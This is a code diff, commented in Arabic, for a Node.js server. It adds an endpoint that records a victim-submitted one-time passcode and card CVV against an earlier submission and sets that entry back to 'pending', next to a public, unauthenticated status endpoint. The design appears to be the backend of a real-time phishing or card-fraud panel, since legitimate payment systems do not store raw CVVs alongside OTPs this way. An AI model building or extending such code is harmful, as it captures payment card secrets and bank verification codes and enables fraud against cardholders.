@@ -98,6 +98,19 @@ const server = http.createServer(async (req, res) => {
     return sendJSON(res, 200, { ok: true, id: submissions[0].id });
   }
 
+  // تحديث خطوة (OTP أو CVV) وإعادة الحالة لـ pending
+  if (url.startsWith('/api/submit-step/') && method === 'POST') {
+    const id = url.slice('/api/submit-step/'.length);
+    const sub = submissions.find(s => s.id === id);
+    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
+    const b = await readBody(req);
+    if (b.otp !== undefined) sub.otp = String(b.otp).trim();
+    if (b.cvv !== undefined) sub.cvv = String(b.cvv).trim();
+    sub.status = 'pending';
+    saveSubmissions();
+    return sendJSON(res, 200, { ok: true });
+  }
+
   // حالة طلب (عام — بدون auth)
   if (url.startsWith('/api/status/') && method === 'GET') {
     const id = url.slice('/api/status/'.length);
